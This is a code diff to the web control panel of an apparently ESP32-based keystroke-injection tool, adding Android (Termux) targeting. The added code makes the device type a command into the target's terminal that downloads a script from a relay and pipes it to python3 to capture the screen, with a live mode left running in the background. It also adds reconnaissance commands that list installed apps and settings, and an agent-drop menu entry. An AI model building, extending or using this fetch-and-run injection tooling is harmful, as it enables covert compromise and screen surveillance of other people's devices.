@@ -507,6 +507,7 @@ select:focus { outline: none; border-color: var(--green); }
         <div class="drop-item" onclick="dropAgent('windows')">🪟 Windows (PowerShell)</div>
         <div class="drop-item" onclick="dropAgent('linux')">🐧 Linux / Kali (Python3)</div>
         <div class="drop-item" onclick="dropAgent('macos')">🍎 macOS (Python3)</div>
+        <div class="drop-item" onclick="dropAgent('android')">🤖 Android (Termux open first)</div>
       </div>
     </div>
   </div>
@@ -596,6 +597,22 @@ select:focus { outline: none; border-color: var(--green); }
       </div>
     </div>
 
+    <!-- Android / media -->
+    <div class="card">
+      <div class="card-title">📱 Android + Media</div>
+      <div style="font-size:.72em;color:var(--fg2);margin-bottom:8px;">Android navigation (USB HID) + volume / media for any OS</div>
+      <div class="key-grid">
+        <div class="kbtn wide" onclick="consumerKey('ANDROID_HOME')">⌂ Home</div>
+        <div class="kbtn wide" onclick="consumerKey('ANDROID_BACK')">◁ Back</div>
+        <div class="kbtn" onclick="consumerKey('VOLUME_UP')">🔊 Vol+</div>
+        <div class="kbtn" onclick="consumerKey('VOLUME_DOWN')">🔉 Vol−</div>
+        <div class="kbtn" onclick="consumerKey('MUTE')">🔇 Mute</div>
+        <div class="kbtn" onclick="consumerKey('PLAY_PAUSE')">⏯ Play</div>
+        <div class="kbtn" onclick="consumerKey('NEXT_TRACK')">⏭ Next</div>
+        <div class="kbtn" onclick="consumerKey('PREV_TRACK')">⏮ Prev</div>
+      </div>
+    </div>
+
     <!-- macros -->
     <div class="card">
       <div class="card-title">Saved Macros</div>
@@ -634,6 +651,7 @@ select:focus { outline: none; border-color: var(--green); }
       <option value="windows">🪟 Windows</option>
       <option value="linux">🐧 Linux / Kali</option>
       <option value="macos">🍎 macOS</option>
+      <option value="android">🤖 Android (Termux)</option>
       <option value="camera">📷 IP Camera</option>
     </select>
 
@@ -1455,6 +1473,7 @@ function populateQuickCmds(os) {
   const el = document.getElementById('devQuickCmds');
   const win = os.toLowerCase().includes('win');
   const mac = os.toLowerCase().includes('mac');
+  const droid = os.toLowerCase().includes('android');
   const cmds = win ? [
     ['whoami','whoami'], ['hostname','hostname'], ['ipconfig','ipconfig /all'],
     ['users','net user'], ['procs','tasklist'], ['sysinfo','systeminfo'],
@@ -1462,6 +1481,10 @@ function populateQuickCmds(os) {
   ] : mac ? [
     ['whoami','whoami'], ['hostname','hostname'], ['ifconfig','ifconfig'],
     ['users','dscl . list /Users|grep -v _'], ['procs','ps aux|head -20'], ['sysinfo','sw_vers'],
+  ] : droid ? [
+    ['id','id'], ['device','getprop ro.product.model'], ['version','getprop ro.build.version.release'],
+    ['ip addr','ip addr'], ['apps','pm list packages -3'], ['battery','dumpsys battery | grep level'],
+    ['storage','df -h'], ['settings','settings list global | head -30'],
   ] : [
     ['whoami','whoami'], ['hostname','hostname'], ['ip addr','ip addr'],
     ['users','cat /etc/passwd|cut -d: -f1'], ['procs','ps aux|head -20'], ['id','id'],
@@ -1521,6 +1544,15 @@ const OS_CONFIG = {
     live:    () => spotlightRun(`python3 <(curl -s '${RELAY_BASE}/sh/mac-live')`),
     hint: `ESP32 opens Spotlight (<strong>Cmd+Space</strong>), launches Terminal, and runs a <em>screencapture</em> command.<br>
            <strong>Requires:</strong> macOS 10.13+, Python 3, internet access.`,
+  },
+  android: {
+    label: 'Android (Termux)',
+    oneShot: () => termuxRun(`curl -fsSL '${RELAY_BASE}/sh/android' | python3`),
+    live:    () => termuxRun(`curl -fsSL '${RELAY_BASE}/sh/android-live' | python3 &`),
+    hint: `Open <strong>Termux</strong> on the Android device first, then tap Capture.<br>
+           ESP32 types the command into the focused Termux window and presses Enter.<br>
+           Uses <code>screencap -p</code> (built-in) or <code>termux-screenshot</code> (Termux:API addon).<br>
+           <strong>Requires:</strong> Termux installed, Python 3 (pkg install python), internet access.`,
   },
   auto: {
     label: 'Auto-detect',
@@ -1585,6 +1617,18 @@ async function spotlightRun(cmd) {
   publish({ type: 'type', text: cmd });
   await sleep(200);
   publish({ type: 'keypress', key: 'ENTER' });
+}
+
+// Termux must already be open and focused on the Android device
+async function termuxRun(cmd) {
+  publish({ type: 'type', text: cmd });
+  await sleep(200);
+  publish({ type: 'keypress', key: 'ENTER' });
+}
+
+// Consumer control (volume / media) — works on Android, Windows, macOS, Linux
+function consumerKey(key) {
+  publish({ type: 'consumer', key });
 }
 
 // ── Auto-detect ───────────────────────────────────────────────────────────────
